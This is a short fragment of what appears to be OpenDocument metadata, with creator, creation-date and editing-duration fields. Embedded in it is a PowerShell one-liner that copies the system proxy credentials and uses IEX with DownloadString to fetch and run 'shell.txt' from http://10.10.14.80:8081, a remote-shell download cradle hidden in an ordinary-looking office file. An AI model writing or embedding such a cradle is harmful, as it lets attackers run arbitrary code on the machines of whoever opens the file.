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nn3r </meta:initial-creator>
    <meta:creation-date>2017-02-06T15:15:47.35</meta:creation-date>
    <dc:date>2026-07-11T07:42:09.289681724</dc:date>
    <meta:editing-duration>PT7M49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o=new-object net.webclient;if([System.Net.WebProxy]::GetDefaultProxy().address -ne $null){$o.proxy=[Net.WebRequest]::GetSystemWebProxy();$o.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;};IEX ((new-object Net.WebClient).DownloadString('http://10.10.14.80:8081/shell.txt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